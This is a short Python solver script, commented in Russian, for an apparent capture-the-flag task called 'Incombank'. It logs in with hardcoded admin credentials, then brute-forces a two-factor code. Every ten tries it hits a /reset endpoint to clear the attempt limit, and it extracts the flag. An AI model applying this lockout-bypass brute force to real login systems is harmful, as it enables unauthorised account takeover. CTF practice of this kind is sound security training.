import requests


def exploit_incombank():
    url = "http://ctfinf.ru:10007"

    # Логинимся
    login_data = {
        "username": "admin",
        "password": "Incom2024!"
    }

    session = requests.Session()
    print("[+] Входим в Инкомбанк...")
    resp = session.post(url, data=login_data)

    if "Двухэтапная проверка" not in resp.text:
        print("[-] Ошибка входа!")
        return

    print("[+] Вход успешен!")
    print("[+] Обнаружена защита: 10 попыток, затем сброс")
    print("[+] Начинаем брутфорс со сбросом...")

    # Брутфорс кода
    for code in range(1200, 1301):
        code_str = str(code)

        # Каждые 10 попыток сбрасываем счетчик
        if code % 10 == 0:
            print(f"[+] Сбрасываем попытки перед кодом {code_str}")
            session.get(f"{url}/reset")

        data = {
            "auth": "true",
            "code": code_str
        }

        resp = session.post(url, data=data)

        if "flag{" in resp.text:
            print(f"[+] УСПЕХ! Код найден: {code_str}")
            start = resp.text.find("flag{")
            end = resp.text.find("}", start) + 1
            flag = resp.text[start:end]
            print(f"[+] ФЛАГ: {flag}")
            return

        if code % 10 == 0:
            print(f"  Прогресс: {code}/1300")

    print("[-] Подбор кода не удался!")


if __name__ == "__main__":
    exploit_incombank()